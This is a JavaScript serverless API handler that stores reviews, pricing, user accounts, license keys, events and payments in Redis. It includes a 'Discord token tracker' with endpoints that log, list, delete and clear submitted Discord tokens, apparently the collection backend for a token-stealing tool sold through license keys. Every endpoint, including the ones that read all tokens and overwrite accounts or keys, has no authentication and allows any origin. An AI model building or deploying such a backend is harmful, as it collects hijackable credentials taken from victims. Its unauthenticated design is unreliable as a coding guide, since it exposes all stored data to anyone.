// api/db.js
// Uses Vercel's built-in Upstash Redis integration
// Env vars auto-set by Vercel: KV_REST_API_URL and KV_REST_API_TOKEN

const REDIS_URL = process.env.KV_REST_API_URL;
const REDIS_TOKEN = process.env.KV_REST_API_TOKEN;

async function redis(command) {
  if (!REDIS_URL || !REDIS_TOKEN) throw new Error('Redis not configured — connect Upstash in Vercel Storage tab');
  const res = await fetch(`${REDIS_URL}`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${REDIS_TOKEN}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(command)
  });
  const data = await res.json();
  if (data.error) throw new Error(data.error);
  return data.result;
}

async function get(key) {
  const val = await redis(['GET', key]);
  if (!val) return null;
  try { return JSON.parse(val); } catch { return val; }
}

async function set(key, value) {
  return redis(['SET', key, JSON.stringify(value)]);
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { action, payload = {} } = req.body || {};

  try {
    switch (action) {

      // --- REVIEWS MANAGEMENT ---
      case 'get_reviews': {
        const reviews = await get('br_reviews') || [];
        return res.json({ ok: true, data: reviews });
      }
      case 'set_reviews':
      case 'save_reviews': {  // Added case alias to support both formats securely
        const reviewsData = payload.reviews !== undefined ? payload.reviews : payload;
        await set('br_reviews', reviewsData);
        return res.json({ ok: true });
      }

      // --- PRICING CONFIGURATION ---
      case 'get_pricing': {
        const pricing = await get('br_pricing') || {};
        return res.json({ ok: true, data: pricing });
      }
      case 'set_pricing':
      case 'save_pricing': {  // Added case alias to support admin.html actions
        const pricingData = payload.pricing !== undefined ? payload.pricing : payload;
        await set('br_pricing', pricingData);
        return res.json({ ok: true });
      }

      // --- ACCOUNT MANAGEMENT ---
      case 'get_accounts': {
        const accounts = await get('br_accounts') || {};
        return res.json({ ok: true, data: accounts });
      }
      case 'set_account':
      case 'save_accounts': { // Support blanket updates from admin dashboard
        if (payload.username && payload.data) {
          const accounts = await get('br_accounts') || {};
          accounts[payload.username] = payload.data;
          await set('br_accounts', accounts);
        } else {
          await set('br_accounts', payload);
        }
        return res.json({ ok: true });
      }
      case 'delete_account': {
        const { username } = payload;
        const accounts = await get('br_accounts') || {};
        delete accounts[username];
        await set('br_accounts', accounts);
        return res.json({ ok: true });
      }

      // --- LICENSE KEYS CONTROLS ---
      case 'get_keys': {
        const keys = await get('br_keys') || {};
        return res.json({ ok: true, data: keys });
      }
      case 'set_keys':
      case 'save_keys': {  // Added case alias to clear save issues
        const keys = payload.keys || payload;
        await set('br_keys', keys);
        return res.json({ ok: true });
      }
      case 'delete_key': {
        const keys = await get('br_keys') || {};
        delete keys[payload.key];
        await set('br_keys', keys);
        return res.json({ ok: true });
      }
      case 'is_key_redeemed': {
        const accounts = await get('br_accounts') || {};
        const used = Object.values(accounts).some(a => a.key === payload.key);
        return res.json({ ok: true, used });
      }

      // --- EVENT HISTORY ---
      case 'push_event': {
        const events = await get('br_events') || [];
        events.unshift({ ...payload.event, ts: Date.now() });
        await set('br_events', events.slice(0, 500));
        return res.json({ ok: true });
      }
      case 'get_events': {
        const events = await get('br_events') || [];
        return res.json({ ok: true, data: events });
      }
      case 'clear_events': {
        await set('br_events', []);
        return res.json({ ok: true });
      }

      // --- DISCORD TOKEN TRACKER ---
      case 'log_token': {
        const { token, label } = payload;
        const tokens = await get('br_tokens') || [];
        if (!tokens.find(t => t.token === token)) {
          tokens.unshift({ token, label, ts: Date.now() });
          await set('br_tokens', tokens.slice(0, 100));
        }
        return res.json({ ok: true });
      }
      case 'get_tokens': {
        const tokens = await get('br_tokens') || [];
        return res.json({ ok: true, data: tokens });
      }
      case 'delete_token': {
        const tokens = await get('br_tokens') || [];
        tokens.splice(payload.index, 1);
        await set('br_tokens', tokens);
        return res.json({ ok: true });
      }
      case 'clear_tokens': {
        await set('br_tokens', []);
        return res.json({ ok: true });
      }

      // --- EXTRA METRICS ---
      case 'get_payments': {
        const payments = await get('bra_payments_data') || [];
        return res.json({ ok: true, data: payments });
      }

      default:
        return res.status(400).json({ error: 'Unknown action: ' + action });
    }
  } catch (e) {
    return res.status(500).json({ error: e.message });
  }
};
